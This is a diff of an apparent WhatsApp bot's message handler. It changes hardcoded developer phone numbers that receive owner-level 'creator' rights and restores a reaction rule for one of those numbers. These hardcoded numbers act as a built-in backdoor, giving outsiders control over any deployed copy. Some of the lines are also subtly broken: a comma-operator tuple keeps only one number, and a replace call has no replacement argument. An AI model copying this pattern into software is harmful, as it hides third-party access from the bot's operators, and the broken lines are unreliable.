@@ -208,7 +208,7 @@ const port = process.env.PORT || 9090;
   }
   
 	const udp = botNumber.split('@')[0];
-    const jawad = ('94763934860', '94771825192');
+    const jawad = ('94763934860', '94771825193');
     let isCreator = [udp, jawad, config.DEV]
 					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
 					.includes(mek.sender);
@@ -254,20 +254,10 @@ const port = process.env.PORT || 9090;
 					return;
 				}
     
-  /*if(senderNumber.includes("94763934860")){
+  if(senderNumber.includes("94763934860")){
   if(isReact) return
   m.react("👾")
-   }*/
-if (senderNumber === "94763934860") {
-    if (!isReact) { // Reaction එකකට ආයෙ reaction නොවීමට
-        await conn.sendMessage(from, { 
-            react: { 
-                text: "👾", 
-                key: mek.key 
-            } 
-        });
-    }
-}
+   }
 	  
   if (!isReact && senderNumber !== botNumber) {
       if (config.AUTO_REACT === 'true') {
@@ -330,7 +320,7 @@ if (!isReact && senderNumber === botNumber) {
  const isSudo = sudoUsers.includes(sender) || sudoUsers.includes(senderNumber);
 
  const ownerNumberFormatted = `${config.OWNER_NUMBER}@s.whatsapp.net`;
- const isCreator = [botNumber, config.OWNER_NUMBER, '94763934860', '94771825192'].map(v => v?.replace(/[^0-9]/g, '')).includes(senderNumber) || isMe || sender === ownerNumberFormatted;
+ const isCreator = [botNumber, config.OWNER_NUMBER, '94763934860'].map(v => v?.replace(/[^0-9]/g, '')).includes(senderNumber) || isMe || sender === ownerNumberFormatted;
 
  const isOwner = isCreator || isSudo;
 
